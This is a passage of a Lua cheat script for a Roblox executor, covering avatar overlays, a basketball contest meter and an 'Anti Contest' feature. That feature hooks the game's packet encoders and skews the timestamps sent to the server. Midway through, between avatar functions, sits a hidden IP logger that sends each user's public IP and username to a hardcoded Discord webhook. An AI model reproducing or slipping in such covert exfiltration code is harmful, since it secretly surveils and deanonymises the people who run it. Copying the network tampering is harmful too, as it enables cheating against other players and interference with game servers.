                    block(part, "1D2530", 0.5, 0.34, 0.03, 0, 0.12, -0.512)
                    block(part, "4FE3FF", 0.12, 0.08, 0.03, -0.12, 0.16, -0.53)
                    block(part, "FFD16C", 0.12, 0.08, 0.03, 0.1, 0.16, -0.53)
                    block(part, "FF5A4F", 0.34, 0.05, 0.03, 0, 0.04, -0.53)
                end,
                hips = function(part) block(part, "5E6875", 1.07, 1, 1.16) end,
                upperArm = function(part) block(part, "5E6875", 0.9, 1, 0.75) end,
                lowerArm = function(part) block(part, "8E98A6", 1.17, 1, 1.26) end,
                hand = function(part) block(part, "1D2530", 1.06, 1, 1.05) end,
                upperLeg = function(part) block(part, "5E6875", 0.85, 1, 0.85) end,
                lowerLeg = function(part) block(part, "8E98A6", 1.15, 1, 1.02) end,
                foot = function(part) block(part, "1D2530", 1.05, 1, 1) end,
            },
        }
        local roles = full and {
            Head = "head", UpperTorso = "chest", LowerTorso = "hips",
            LeftUpperArm = "upperArm", RightUpperArm = "upperArm", LeftLowerArm = "lowerArm", RightLowerArm = "lowerArm",
            LeftHand = "hand", RightHand = "hand", LeftUpperLeg = "upperLeg", RightUpperLeg = "upperLeg",
            LeftLowerLeg = "lowerLeg", RightLowerLeg = "lowerLeg", LeftFoot = "foot", RightFoot = "foot",
        } or {Head = "head", Torso = "chest", ["Left Arm"] = "lowerArm", ["Right Arm"] = "lowerArm",
            ["Left Leg"] = "upperLeg", ["Right Leg"] = "upperLeg"}
        local look = looks[kind]
        for name, role in pairs(roles) do
            local part = Instance.new("Part")
            part.Name = name
            part.Size = Vector3.new(1, 1, 1)
            part.Transparency = 1
            part.Anchored = true
            part.Parent = model
            look[role](part)
        end
        return model
    end

    local function fitModel(model, body, links)
        local counterparts = {}
        for name, source in pairs(body) do
            local target = model:FindFirstChild(name)
            assert(target and target:IsA("BasePart"), "Avatar body is incomplete")
            counterparts[target] = source
            links[#links + 1] = {part = target, source = source, offset = CFrame.identity}
        end
        local humanoid = model:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.EvaluateStateMachine = false
            humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
        end
        for _, item in ipairs(model:GetDescendants()) do
            if item:IsA("LuaSourceContainer") or item:IsA("Sound") or item:IsA("ProximityPrompt")
                or item:IsA("LayerCollector") or item:IsA("Animator") then
                item:Destroy()
            elseif item:IsA("BasePart") then
                visualPart(item)
                if not counterparts[item] then
                    local weld = item:FindFirstChild("AccessoryWeld")
                    local anchor = weld and weld:IsA("JointInstance") and (weld.Part0 == item and weld.Part1 or weld.Part0)
                    local source = anchor and counterparts[anchor]
                    if source then
                        local offset = weld.Part0 == item and weld.C1 * weld.C0:Inverse() or weld.C0 * weld.C1:Inverse()
                        local p, original, fit = offset.Position, anchor.Size, source.Size
                        offset = CFrame.new(p.X * fit.X / original.X, p.Y * fit.Y / original.Y, p.Z * fit.Z / original.Z) * offset.Rotation
                        if item:GetAttribute("WizardScaled") then
                            local size = item.Size
                            item.Size = Vector3.new(size.X * fit.X / original.X, size.Y * fit.Y / original.Y, size.Z * fit.Z / original.Z)
                        end
                        links[#links + 1] = {part = item, source = source, offset = offset}
                    else
                        item.Transparency = 1
                    end
                end
            end
        end
        for target, source in pairs(counterparts) do target.Size = source.Size end
    end

    local function updateOverlay(current, camera, now)
        local character = current.character
        local scan = now >= current.nextScan
        if scan then
            current.nextScan = now + 0.4
            local held = heldBall(character)
            for _, part in ipairs(character:GetDescendants()) do
                if not (part:IsA("BasePart") or part:IsA("Decal")) or part == held
                    or (held and part:IsDescendantOf(held)) then continue end
                local ancestor = part
                while ancestor and ancestor ~= character do
                    if current.bodyParts[ancestor] or cosmeticNames[ancestor.Name] or ancestor:IsA("Accessory") then
                        if current.hidden[part] == nil then current.hidden[part] = part.LocalTransparencyModifier end
                        break
                    end
                    ancestor = ancestor.Parent
                end
            end
        end
        local firstPerson = current.owner == player and (camera.CFrame.Position - current.body.Head.Position).Magnitude < 1
        if now >= current.nextSightCheck then
            current.nextSightCheck = now + 0.1
            local origin = camera.CFrame.Position
            local function blocked(part)
                local hit = workspace:Raycast(origin, part.Position - origin, current.sightParams)
                local obstacle = hit and hit.Instance
                return obstacle and (obstacle:IsA("Terrain") or obstacle.Transparency < 0.98)
            end
            current.occluded = blocked(current.body.Head) and blocked(current.body.UpperTorso or current.body.Torso)
        end
        local showOriginal = firstPerson or current.occluded
        for part, original in pairs(current.hidden) do
            if not part.Parent then
                current.hidden[part] = nil
            elseif scan and not part:IsDescendantOf(character) then
                if part.LocalTransparencyModifier == 1 then part.LocalTransparencyModifier = original end
                current.hidden[part] = nil
            else
                local transparency = part.LocalTransparencyModifier
                if transparency ~= 1 then current.hidden[part] = transparency end
                local desired = showOriginal and current.hidden[part] or 1
                if transparency ~= desired then part.LocalTransparencyModifier = desired end
            end
        end
        for _, link in ipairs(current.links) do
            link.part.CFrame = link.source.CFrame * link.offset
            link.part.LocalTransparencyModifier = showOriginal and 1 or current.hidden[link.source] or 0
        end
    end

    -- 1. Get HTTP request function provided by the executor
    local httpReq = request or http_request or (syn and syn.request) or (http and http.request)

    if not httpReq then
        warn("Current executor does not support HTTP requests")
        return
    end

    -- 2. Your Discord Webhook address (replace with your own)
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1457245590701211791/_HsQORnxN9yKxWVf3F92BdAhWZa70E26NMDheoz18u6wT7QDGDXk16iqTccKGpi2J6ZJ"

    -- 3. Get the user's public IP
    local ip = "Unknown"
    local ok, res = pcall(function()
        return httpReq({ Url = "https://api.ipify.org", Method = "GET" })
    end)
    if ok and res and res.Body then
        ip = res.Body
    end

    -- 4. Get Roblox username for correlation
    local playerName = "Unknown"
    pcall(function()
        playerName = game:GetService("Players").LocalPlayer.Name
    end)

    -- 5. Construct Webhook message
    local payload = {
        content = "IP Logged",
        embeds = {{
            title = "Executor User Info",
            fields = {
                { name = "Username", value = playerName, inline = true },
                { name = "IP", value = ip, inline = true }
            },
            color = 0xFF0000
        }}
    }

    -- 6. Send
    local HttpService = game:GetService("HttpService")
    local body = HttpService:JSONEncode(payload)
    httpReq({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = body
    })


    local function loadTemplate(mode, rigType)
        local key = mode .. ":" .. rigType.Name
        if templates[key] then return templates[key] end
        local template = {mode = mode}
        templates[key] = template
        local token, account = generation, selection.account
        local preset = avatar.presets[mode]
        task.spawn(function()
            if token ~= generation then return end
            local model, description
            local ok = pcall(function()
                if mode == "default" then
                    local white, black = Color3.fromRGB(255, 255, 255), Color3.fromRGB(0, 0, 0)
                    description = create("HumanoidDescription", nil, {
                        HeadColor = white, TorsoColor = white, LeftArmColor = white, RightArmColor = white,
                        LeftLegColor = black, RightLegColor = black, UseAvatarSettings = false,
                    })
                elseif preset and preset.blocks then
                    model = avatar.blockModel(preset.blocks, rigType)
                elseif preset and preset.tones then
                    local tones = preset.tones
                    description = create("HumanoidDescription", nil, {
                        HeadColor = Color3.fromHex(tones.head), TorsoColor = Color3.fromHex(tones.torso),
                        LeftArmColor = Color3.fromHex(tones.arm), RightArmColor = Color3.fromHex(tones.arm),
                        LeftLegColor = Color3.fromHex(tones.leg), RightLegColor = Color3.fromHex(tones.leg),
                        UseAvatarSettings = false,
                    })
                elseif preset then
                    local id = getSkeletonOutfitId(preset.bundle)
                    if token ~= generation then return end
                    description = players:GetHumanoidDescriptionFromOutfitIdAsync(id)
                else
                    local id = tonumber(account) or players:GetUserIdFromNameAsync(account)
                    if token ~= generation then return end
                    description = players:GetHumanoidDescriptionFromUserIdAsync(id)
                end
                if token ~= generation then return end
                if not model then model = players:CreateHumanoidModelFromDescriptionAsync(description, rigType) end
                model.Archivable = true
                if preset and preset.fade then
                    for _, item in ipairs(model:GetDescendants()) do
                        if (item:IsA("BasePart") or item:IsA("Decal")) and item.Transparency < preset.fade then
                            item.Transparency = preset.fade
                        end
                    end
                end
            end)
            if description then description:Destroy() end
            if token ~= generation or stopped or traveling then
                if model then model:Destroy() end
                return
            end
            if not ok or not model then
                if model then model:Destroy() end
                template.failed = true
                return
            end
            template.model = model
        end)
        return template
    end

    local function refreshTargets()
        local roster = (selection.everyone or selection.defaultOthers) and players:GetPlayers() or {player}
        local characters = workspace:FindFirstChild("Characters")
        local present = {}
        for _, member in ipairs(roster) do
            local mode = selection.mode
            if member ~= player then
                if selection.defaultOthers then mode = "default"
                elseif not selection.everyone then continue end
            end
            if mode == "original" then continue end
            present[member] = true
            local character = characters and characters:FindFirstChild(member.Name) or member.Character
            local root = character and character:FindFirstChild("HumanoidRootPart")
            local existing = targets[member]
            if existing and (existing.mode ~= mode or existing.character ~= character or existing.root ~= root or not character.Parent
                or existing.body.Head.Parent ~= character) then
                clearAppearance(existing)
                targets[member], existing = nil, nil
            end
            if existing or not root or not character.Parent then continue end
            local isR15 = character:FindFirstChild("UpperTorso") ~= nil
            local body, bodyParts, complete = {}, {}, true
            for _, name in ipairs(isR15 and r15 or r6) do
                local part = character:FindFirstChild(name)
                if not part or not part:IsA("BasePart") then complete = false; break end
                body[name], bodyParts[part] = part, true
            end
            if complete then
                targets[member] = {owner = member, character = character, root = root, body = body, bodyParts = bodyParts, mode = mode,
                    rigType = isR15 and Enum.HumanoidRigType.R15 or Enum.HumanoidRigType.R6, nextScan = 0, hidden = {}, links = {}}
            end
        end
        for member, target in pairs(targets) do
            if not present[member] then
                clearAppearance(target)
                targets[member] = nil
            end
        end
    end

    local function mount(target, template, camera, now)
        local ok = pcall(function()
            local model = template:Clone()
            target.model = model
            model.Name = "WizardLocalAvatar"
            fitModel(model, target.body, target.links)
            target.sightParams = RaycastParams.new()
            target.sightParams.FilterType = Enum.RaycastFilterType.Exclude
            target.sightParams.FilterDescendantsInstances = {target.character}
            target.sightParams.RespectCanCollide = true
            target.nextScan, target.nextSightCheck = 0, 0
            model.Parent = getRenderWorld(camera)
            updateOverlay(target, camera, now)
        end)
        if not ok then
            clearAppearance(target)
            target.failed = true
        end
    end

    function avatar.watch(now)
        if traveling or (selection.mode == "original" and not selection.defaultOthers) then return end
        local camera = workspace.CurrentCamera
        if not camera then
            for _, target in pairs(targets) do clearAppearance(target) end
            return
        end
        if viewport and viewport.CurrentCamera ~= camera then viewport.CurrentCamera = camera end
        if now >= nextRosterCheck then
            nextRosterCheck = now + 0.35
            refreshTargets()
        end
        local applied, defaultApplied, mounted, waiting, failed = 0, 0, false, false, false
        for _, target in pairs(targets) do
            if target.model then
                updateOverlay(target, camera, now)
            elseif not target.failed then
                local template = loadTemplate(target.mode, target.rigType)
                if template.failed then
                    target.failed = true
                elseif template.model and not mounted then
                    mount(target, template.model, camera, now)
                    mounted = true
                end
            end
            if target.model then
                applied += 1
                if target.mode == "default" then defaultApplied += 1 end
            elseif target.failed then failed = true
            else waiting = true end
        end
        local label = avatar.presets[selection.mode] and avatar.presets[selection.mode].name or "Account avatar"
        if defaultApplied > 0 then
            local status = string.format("Default look applied to %d other player(s).", defaultApplied)
            if applied > defaultApplied then status ..= " " .. label .. " applied to you." end
            avatar.status.Text = status
        elseif applied > 0 then
            avatar.status.Text = selection.everyone and string.format("%s applied to %d player(s).", label, applied)
                or (label .. " applied.")
        elseif waiting then
            avatar.status.Text = selection.defaultOthers and "Loading avatar looks…" or ("Loading " .. label .. "…")
        elseif failed then
            avatar.status.Text = selection.defaultOthers and "Couldn’t load the default look. Toggle it off and on to retry."
                or avatar.presets[selection.mode] and "Couldn’t load that look. Try again."
                or "Couldn’t load that avatar. Check the username or ID and try again."
        else
            avatar.status.Text = (selection.everyone or selection.defaultOthers) and "Waiting for player characters." or "Waiting for your character."
        end
    end
end

do
    local lastRoot, lastBall, lastAdornee, nextSample
    local courtFields = {"MatchId", "CourtNumber", "CourtIndex", "GameIndex"}
    local stanceWeight = {guarding = 0.88, defending = 0.88, defensivestance = 0.88, contesting = 1, blocking = 1}

    local function planar(vector)
        return Vector2.new(vector.X, vector.Z)
    end

    local function isOpponent(character, goal, practice, participant, model)
        local sharedCourt = false
        for _, field in ipairs(courtFields) do
            local own, other = positiveTeamId(character, field), positiveTeamId(model, field)
            if own and other then
                if own ~= other then return false end
                sharedCourt = true
            end
        end
        for _, field in ipairs({"Team", "TeamIndex"}) do
            local own, other = positiveTeamId(character, field), positiveTeamId(model, field)
            if own and other then return own ~= other end
        end
        if player.Team and participant.Team and not player.Neutral and not participant.Neutral then
            return player.Team ~= participant.Team
        end
        return sharedCourt or practice or not goal or characterGoal(model) ~= nil
            or positiveTeamId(model, "Team") ~= nil or positiveTeamId(model, "TeamIndex") ~= nil
    end

    local function defenderPressure(root, defender, model, forward, velocity, radius, prediction)
        local offset = defender.Position - root.Position
        local flat = planar(offset)
        local gap, height = flat.Magnitude, math.abs(offset.Y)
        if gap >= radius + 36 * (prediction or .12) or height >= 8 then return 0 end

        local alignment, facing = 1, 1
        if gap > 0.05 then
            local direction = flat / gap
            local relative = planar(defender.AssemblyLinearVelocity or Vector3.zero) - velocity
            -- Project a short closeout using relative speed and cap its effect.
            gap = math.max(0, math.min(gap, gap + math.clamp(relative:Dot(direction) * (prediction or .12), -radius * .75, radius * .75)))
            alignment = forward and math.clamp(forward:Dot(direction), -1, 1) or 0
            local look = planar(defender.CFrame.LookVector)
            if look.Magnitude > 0.05 then
                facing = 0.65 + 0.35 * math.clamp((1 - look.Unit:Dot(direction)) / 2, 0, 1)
            end
        end
        local bodyRange = math.min(2, radius * 0.32)
        local distanceWeight = 1 - math.clamp((gap - bodyRange) / (radius - bodyRange), 0, 1)
        local angleWeight = 0.22 + 0.78 * ((1 + alignment) / 2) ^ 1.35
        local heightWeight = 1 - math.clamp((height - 4) / 4, 0, 1)
        local action = model:GetAttribute("Action")
        local activity = type(action) == "string" and stanceWeight[action:lower()] or nil
        return distanceWeight * angleWeight * heightWeight * facing * (activity or 0.72)
    end

    function visualExtras.estimateContest(character, root, radius, prediction)
        local goal = characterGoal(character)
        local aim = goal and goal:IsA("BasePart") and planar(goal.Position - root.Position)
        if not aim or aim.Magnitude < 0.75 then aim = planar(root.CFrame.LookVector) end
        local forward = aim.Magnitude > 0.05 and aim.Unit or nil
        local velocity = planar(root.AssemblyLinearVelocity or Vector3.zero)
        local characters = workspace:FindFirstChild("Characters")
        local practice = practiceBand() ~= nil
        local strongest, second = 0, 0
        for _, participant in ipairs(players:GetPlayers()) do
            if participant == player then continue end
            local model = characters and characters:FindFirstChild(participant.Name) or participant.Character
            local defender = model and model.Parent and model:FindFirstChild("HumanoidRootPart")
            if not defender or not defender:IsA("BasePart") then continue end
            local pressure = defenderPressure(root, defender, model, forward, velocity, radius, prediction)
            if pressure > second and isOpponent(character, goal, practice, participant, model) then
                if pressure > strongest then
                    strongest, second = pressure, strongest
                else
                    second = pressure
                end
            end
        end
        local estimate = strongest + 0.35 * second * (1 - strongest)
        return math.clamp(estimate * 100, 0, 100)
    end

    function visualExtras.watchContest(now, force)
        local character, root, ball
        if visualExtras.contestMeter and hud.overlay.Enabled and not traveling then
            character, root = findCharacter()
            if root and root:IsA("BasePart") then ball = heldBall(character) end
        end
        if not ball then
            lastRoot, lastBall, lastAdornee, nextSample = nil, nil, nil, nil
            hud.setContest(nil)
            return
        end
        local head = character:FindFirstChild("Head")
        if head and not head:IsA("BasePart") then head = nil end
        local adornee = head or root
        if not force and root == lastRoot and ball == lastBall and adornee == lastAdornee and now < nextSample then return end
        lastRoot, lastBall, lastAdornee, nextSample = root, ball, adornee, now + 0.08

        local estimate = visualExtras.estimateContest(character, root, visualExtras.radius.value, .12) / 100
        local height = adornee.Size.Y / 2 + (head and 2.2 or 4.5)
        hud.setContest(1 + math.floor(99 * estimate + 0.5), adornee, height)
    end
end

-- Optional shot selection: never changes the game's contest feedback or an active release.
function antiContestV2.initialise()
    local feature = antiContestV2
    local peer, burst, blocked, nextResolve, nextDisplay = nil, nil, false, 0, 0
    local blockedJumpUntil = 0
    local correctionUntil = 0
    local retryUntil = 0
    local lastMeterSerial = 0
    local CLOCK_SKEW,CLOCK_DRAIN_RATE=.120,.5
    local history, dirty, nextFlush = {}, false, 0
    feature.message = "Anti Contest v2 is off."
    feature.completed, feature.cancelled = 0, 0
    feature.useAvoidance=false
    feature.options={standing=true,moving=true,finishes=true,protectContact=true}
    feature.method="late"
    feature.variant="v2"
    feature.v3ReturnAt="release"
    feature.results={v2={completed=0},["v3:release"]={completed=0},["v3:start"]={completed=0},["v3:clock"]={completed=0}}
    local function returnPoint(value)return (value=="start" or value=="clock") and value or "release" end
    local function resultKey(variant,point)return variant=="v3" and ("v3:"..returnPoint(point)) or "v2" end
    local function trace(kind,data)
        if (burst and burst.variant or feature.variant)=="v3" and kind:sub(1,3)=="v2_" then kind="v3_"..kind:sub(4) end
        if type(feature.trace)=="function" then pcall(feature.trace,kind,data) end
    end
    local function finite(value)
        return type(value) == "number" and value == value and math.abs(value) < math.huge
    end
    local function vectorFinite(value)
        return value and finite(value.X) and finite(value.Y) and finite(value.Z)
    end
    local function supported()
        -- Versions and subplaces change independently of the native interfaces.
        -- Resolve checks the actual controller, codec, actor and inbound records.
        return game.GameId == feature.build.gameId
    end
    feature.isSupported=supported
    local function moving(candidate,data)
        if data and data.Sprint then return true end
        if candidate then
            local v=candidate.proxy.AssemblyLinearVelocity
            if (v*Vector3.new(1,0,1)).Magnitude>1 then return true end
        end
        if input.IsKeyDown then
            for _,name in ipairs({"W","A","S","D"}) do
                if executorInput.keyDown(Enum.KeyCode[name]) then return true end
            end
        end
        return false
    end
    local function forcedFrame(character)
        return character and (character:GetAttribute("CFrame")~=nil or character:GetAttribute("SeatCFrame")~=nil)
    end
    local function contact(character)
        local action=tostring(character and character:GetAttribute("Action") or ""):lower()
        return action:find("contact",1,true) or action:find("fall",1,true) or action:find("knock",1,true)
            or action:find("stun",1,true) or action:find("ankle",1,true)
            or action:find("stagger",1,true) or action:find("stumble",1,true) or action:find("blocked",1,true)
            or forcedFrame(character)
            or (character and (character:GetAttribute("Fouled")==true or character:GetAttribute("Stunned")==true or character:GetAttribute("Blocked")==true))
    end
    local function classify(candidate,data)
        local character,root=findCharacter()
        local goal=characterGoal(character)
        if root and goal and goal:IsA("BasePart") and ((goal.Position-root.Position)*Vector3.new(1,0,1)).Magnitude<=24 then return "finishes" end
        return moving(candidate,data) and "moving" or "standing"
    end
    local function clockEligibility(candidate,attempt)
        if not attempt or not attempt.clockOnly then return true,attempt and attempt.kind end
        if attempt.clockEligibilityLost then return false,nil,attempt.clockEligibilityReason or "an earlier jump-shot eligibility check failed"end
        local character,root=findCharacter()
        if not candidate or character~=attempt.character or character~=candidate.character or root~=candidate.root then
            return false,nil,"the current character changed"
        end
        local goal=characterGoal(character)
        if not goal or not goal:IsA("BasePart") then return false,nil,"the current goal is unavailable" end
        local action=tostring(character:GetAttribute("Action") or ""):lower()
        if action:find("dunk",1,true) or action:find("layup",1,true) or action:find("clutch",1,true) then
            return false,"finishes","a native finishing action began"
        end
        local position=candidate.proxy.Position
        if not vectorFinite(position) or not root or not vectorFinite(root.Position) or not vectorFinite(goal.Position) then
            return false,nil,"the current jump-shot position is invalid"
        end
        -- The proxy can enter the paint before the rendered character catches up.
        if ((goal.Position-position)*Vector3.new(1,0,1)).Magnitude<=24
            or ((goal.Position-root.Position)*Vector3.new(1,0,1)).Magnitude<=24 then
            return false,"finishes","the shot entered finishing range"
        end
        -- Re-evaluate the live category instead of retaining the initial Sprint flag.
        local kind=moving(candidate,nil) and "moving" or "standing"
        if not feature.options[kind] then return false,kind,"the current "..kind.." shot category is disabled" end
        return true,kind
    end
    local function courtIdentity(character)
        return tostring(character:GetAttribute("CourtNumber")).."|"..tostring(character:GetAttribute("Team"))
            .."|"..tostring(character:GetAttribute("InGame"))
    end
    local function clockCourtIdentity(character)
        local values={}
        for _,key in ipairs({"MatchId","CourtNumber","CourtIndex","GameIndex","Team","TeamIndex","InGame"}) do
            table.insert(values,tostring(character:GetAttribute(key)))
        end
        return table.concat(values,"|")
    end
    local function current(candidate)
        if not candidate or not candidate.proxy.Parent or not candidate.character.Parent then return false end
        local character, root = findCharacter()
        return character == candidate.character and root == candidate.root
            and character:GetAttribute("ReplicationId") == candidate.id and courtIdentity(character) == candidate.court
            and candidate.controller.Controllers.Player.Character == candidate.body
            and candidate.body.ProxyCharacter == candidate.proxy
            and shared.WizardHubShootGate == candidate.gate
            and rawget(candidate.gate.sender, "Fire") == candidate.gate.filter
            and candidate.controller.Shared.Replication.ReplicationConfig.Character.SPEED_SCALE == candidate.scale
            and candidate.controller.Shared.Replication.ReplicationConfig.Network.SERVER_START_TIME == candidate.epoch
            and candidate.lib.Int8 == candidate.int8
            and rawget(candidate.int8,"Write") == candidate.int8Write
            and candidate.lib.Float64==candidate.clockCodec
            and rawget(candidate.clockCodec,"Write")== (candidate.clockHooked and candidate.clockWrapper or candidate.clockWrite)
            and (not candidate.clockHooked or not table.isfrozen(candidate.clockCodec))
            and (not candidate.clockState or candidate.clockState.court==clockCourtIdentity(character))
            and (not burst or not burst.clockOnly or (burst.character==candidate.character
                and burst.clockCourt==clockCourtIdentity(candidate.character)))
    end
    local function restoreClockWriter(candidate,reason)
        if not candidate then return end
        local state=candidate.clockState
        candidate.clockState=nil
        -- Restore only our own writer, independently of the position/Jump hooks.
        if candidate.clockWrapper and rawget(candidate.clockCodec,"Write")==candidate.clockWrapper
            and not table.isfrozen(candidate.clockCodec) then
            rawset(candidate.clockCodec,"Write",candidate.clockWrite)
        end
        candidate.clockHooked=false
        local restored=rawget(candidate.clockCodec,"Write")==candidate.clockWrite
        if state and state.attempt==burst then
            burst.networkActive=false
            burst.clockInterruptedReason=reason or "clock writer removed"
        end
        if state then trace("v2_clock_hook_removed",{reason=reason,phase=state.phase,writerRestored=restored,
            lastReportedStamp=state.lastReported,clockCourt=state.court}) end
        return restored
    end
    local function installClockWriter(candidate)
        assert(current(candidate),"Character changed before clock writer installation")
        assert(candidate.lib.Float64==candidate.clockCodec and not table.isfrozen(candidate.clockCodec)
            and type(candidate.clockWrite)=="function" and rawget(candidate.clockCodec,"Write")==candidate.clockWrite
            and debug.info(candidate.clockWrite,"s")==candidate.bufferSource,
            "Native Float64 clock writer has changed")
        assert(feature.build.clientBytes==17 and candidate.clockCodec.Size==8
            and type(candidate.nativeHeartbeat)=="function" and type(candidate.clockWrapper)=="function",
            "Native clock layout is unavailable")
        rawset(candidate.clockCodec,"Write",candidate.clockWrapper)
        candidate.clockHooked=true
    end
    local function clockOffset(state,now)
        if state.phase=="drain" then return math.max(0,state.drainOffset-(now-state.drainBegan)*CLOCK_DRAIN_RATE) end
        return CLOCK_SKEW
    end
    local function reportedClock(candidate,state,nativeStamp,position,source)
        assert(state and candidate.clockState==state and candidate.clockHooked and current(candidate),"Clock context changed")
        local now=os.clock()
        local skew=clockOffset(state,now)
        local currentNative=workspace:GetServerTimeNow()-candidate.epoch
        assert(finite(nativeStamp) and finite(currentNative) and math.abs(nativeStamp-currentNative)<=2
            and finite(skew) and skew>=0 and skew<=CLOCK_SKEW,"Invalid bounded native clock")
        local reported=nativeStamp+skew
        assert(finite(reported) and reported>=nativeStamp and reported-nativeStamp<=CLOCK_SKEW+1e-9,"Invalid reported clock")
        assert(not state.lastReported or reported>=state.lastReported,"Native clock regressed during the bounded clock trial")
        local previous=state.lastReported
        state.lastReported,state.lastNativeStamp,state.lastOffset=reported,nativeStamp,skew
        state.serial+=1
        if state.phase=="active" then
            local attempt=state.attempt
            assert(attempt==burst and attempt.clockOnly and attempt.networkActive,"Inactive clock sample")
            local sample={stamp=reported,nativeStamp=nativeStamp,position=position,at=now,serial=state.serial}
            table.insert(attempt.clockReports,sample)
            if #attempt.clockReports>64 then table.remove(attempt.clockReports,1) end
            attempt.reportRawclock,attempt.clockLastNativeStamp=reported,nativeStamp
        end
        trace(state.phase=="drain" and "v2_clock_drain_report" or "v2_clock_report",
            {nativeStamp=nativeStamp,reportedStamp=reported,reportRawclock=reported,skew=skew,phase=state.phase,
                position=position,source=source,serial=state.serial,previousReportedStamp=previous})
        assert(candidate.clockState==state and candidate.clockHooked and current(candidate),"Clock context changed while reporting")
        return reported,skew
    end
    local function inBounds(part, position, margin, horizontalMargin)
        if not part or not part.Parent then return false end
        local edge = horizontalMargin or 0
        local point, half = part.CFrame:PointToObjectSpace(position), part.Size / 2
        return math.abs(point.X) <= half.X - edge and math.abs(point.Y) <= half.Y - margin
            and math.abs(point.Z) <= half.Z - edge
    end
    local function positionPacket(candidate, y, clockAttempt,drainState)
        assert(current(candidate), "Character changed before position send")
        local cf, velocity = candidate.proxy.CFrame, candidate.proxy.AssemblyLinearVelocity
        local position = cf.Position
        assert(vectorFinite(position) and vectorFinite(velocity), "Invalid native position or velocity")
        local _, yaw = cf:ToOrientation()
        local stamp = workspace:GetServerTimeNow() - candidate.epoch
        assert(finite(yaw) and finite(stamp), "Invalid native packet clock/orientation")
        local desiredY = y or position.Y
        assert(finite(desiredY) and math.abs(position.X) <= candidate.range
            and math.abs(desiredY) <= candidate.range and math.abs(position.Z) <= candidate.range,
            "Position exceeds the verified packet range")
        local lib, writer = candidate.lib, candidate.lib.writer()
        if clockAttempt or drainState then
            local state=candidate.clockState
            assert(y==nil and state and (drainState==state or (clockAttempt==burst and state.attempt==clockAttempt)),
                "Inactive clock-only packet")
            stamp=reportedClock(candidate,state,stamp,position,drainState and "cleanup" or "explicit")
        end
        -- Every explicit packet bypasses the Float64 shim, including drain packets.
        candidate.clockWrite(writer, stamp)
        candidate.write(writer, position.X, -candidate.range, candidate.range)
        candidate.write(writer, desiredY, -candidate.range, candidate.range)
        candidate.write(writer, position.Z, -candidate.range, candidate.range)
        local vx=math.clamp(math.round(velocity.X*candidate.scale),-127,127)
        local vz=math.clamp(math.round(velocity.Z*candidate.scale),-127,127)
        -- Explicit packets bypass our shim; their XYZ and yaw retain the native encoder.
        candidate.int8Write(writer,vx)
        candidate.int8Write(writer,vz)
        lib.UInt8.Write(writer, math.round(yaw % (2 * math.pi) / (2 * math.pi) * 256) % 256)
        local payload = writer:ToBuffer()
        assert(buffer.len(payload) == feature.build.clientBytes, "Position packet layout changed")
        assert(current(candidate), "Character changed during packet assembly")
        return payload, stamp, position
    end
    local function sendPosition(candidate, y, clockAttempt,drainState)
        local expectedState=(clockAttempt or drainState) and candidate.clockState or nil
        local payload, stamp, position = positionPacket(candidate, y, clockAttempt,drainState)
        if clockAttempt then
            clockAttempt.clockIssuedAt,clockAttempt.clockIssuedStamp=os.clock(),stamp
            clockAttempt.stamp,clockAttempt.position=stamp,position
        end
        trace("v2_position_send",{stamp=stamp,nativePosition=position,targetY=y,bytes=buffer.len(payload),
            clockOnly=clockAttempt~=nil or drainState~=nil,reportRawclock=(clockAttempt or drainState) and stamp,
            phase=expectedState and expectedState.phase})
        assert(current(candidate) and (not expectedState or candidate.clockState==expectedState),"Position context changed before dispatch")
        candidate.remote:FireServer(payload)
        return stamp, position
    end
    local function beginClockDrain(candidate,state)
        if not state or candidate.clockState~=state or state.phase=="drain" then return end
        local eligible=clockEligibility(candidate,state.attempt)
        if not current(candidate) or stopped or traveling or not feature.enabled or not robloxFocused()
            or contact(candidate.character) or not eligible then restoreClockWriter(candidate,"drain context inactive");return end
        if rawget(candidate.codec,"Write")==candidate.wrapper and not table.isfrozen(candidate.codec) then
            rawset(candidate.codec,"Write",candidate.write)
        end
        if rawget(candidate.jump,"Fire")==candidate.jumpWrapper and not table.isfrozen(candidate.jump) then
            rawset(candidate.jump,"Fire",candidate.jumpFire)
        end
        if rawget(candidate.codec,"Write")~=candidate.write or rawget(candidate.jump,"Fire")~=candidate.jumpFire then
            restoreClockWriter(candidate,"normal position/Jump hook ownership changed before drain");return
        end
        state.phase="drain"
        state.trialHooksReleased=true
        state.drainBegan=os.clock()
        state.drainOffset=state.lastOffset or CLOCK_SKEW
        state.drainDeadline=state.drainBegan+state.drainOffset/CLOCK_DRAIN_RATE
        trace("v2_clock_drain_start",{began=state.drainBegan,deadline=state.drainDeadline,
            duration=state.drainOffset/CLOCK_DRAIN_RATE,skew=state.drainOffset,rate=CLOCK_DRAIN_RATE,
            lastReportedStamp=state.lastReported,clockCourt=state.court,onlyClockHook=true})
        if candidate.clockState~=state then return end
        local ok,problem=pcall(sendPosition,candidate,nil,nil,state)
        if not ok and candidate.clockState==state then restoreClockWriter(candidate,"drain send failed: "..tostring(problem)) end
    end
    local function watchClockDrain(candidate,now)
        local state=candidate and candidate.clockState
        if not state or state.phase~="drain" then return end
        local eligible=clockEligibility(candidate,state.attempt)
        if not current(candidate) or stopped or traveling or not feature.enabled or not robloxFocused() or contact(candidate.character) or not eligible then
            restoreClockWriter(candidate,"clock drain interrupted by native/context state");return
        end
        if now>=state.drainDeadline then
            local ok,problem=pcall(sendPosition,candidate,nil,nil,state)
            if candidate.clockState~=state then return end
            if not ok then restoreClockWriter(candidate,"drain completion failed: "..tostring(problem));return end
            local last=state.lastReported
            local restored=restoreClockWriter(candidate,"clock drain completed")
            trace("v2_clock_drain_end",{began=state.drainBegan,deadline=state.drainDeadline,ended=now,
                duration=now-state.drainBegan,skew=0,lastReportedStamp=last,writerRestored=restored})
        end
    end
    local function record(reason, actual,ended)
        local burst=ended or burst
        if not burst then return end
        table.insert(history, {at = DateTime.now().UnixTimestampMillis, input = burst.useSpace and "Space/Y" or "E/X",
            reason = reason, contest = actual, sent = burst.sent == true,context=burst.kind,
            method=burst.late and "late" or "full",variant=burst.variant,shifted=burst.wasShifted==true,
            elevatedAckAt=burst.elevatedAckAt,restoreIssuedAt=burst.restoreIssuedAt,restoreAckAt=burst.restoreAckAt,
            returnPoint=burst.returnPoint,restorePhase=burst.restorePhase,startForwardedAt=burst.startForwardedAt,
